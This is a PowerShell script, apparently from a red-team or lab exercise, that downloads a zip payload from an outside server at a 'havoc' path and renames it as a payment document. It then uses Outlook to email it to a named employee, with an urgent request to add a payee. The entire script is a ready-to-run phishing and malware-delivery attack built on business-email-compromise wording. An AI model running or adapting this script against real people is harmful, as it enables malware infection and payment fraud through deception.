# Define the URL of the hosted file and the local path to save it
$attachmentUrl = "http://198.18.128.188:8000/havoc/phish.zip"
$localAttachmentPath = "C:\Users\Public\payment_instruction.zip"

# Download the file from the HTTP server
Invoke-WebRequest -Uri $attachmentUrl -OutFile $localAttachmentPath

# Create an Outlook application object
$Outlook = New-Object -ComObject Outlook.Application

# Create a new email item
$mail = $Outlook.CreateItem(0)

# Set email parameters
$mail.Subject = "Need this Payee added ASAP"
$mail.Body = "Hi Carol,`n`nI will be out of office tomorrow, please add payee asap as we need to get the payment settled.`n`nBye,`nGrady."
$mail.To = "cdanvers@pseudo-ai.com"

# Add the local attachment (the downloaded zip file) to the email
$mail.Attachments.Add($localAttachmentPath)

# Send the email
$mail.Send()

# Optionally, clean up the downloaded file after sending the email
# Remove-Item $localAttachmentPath -Force

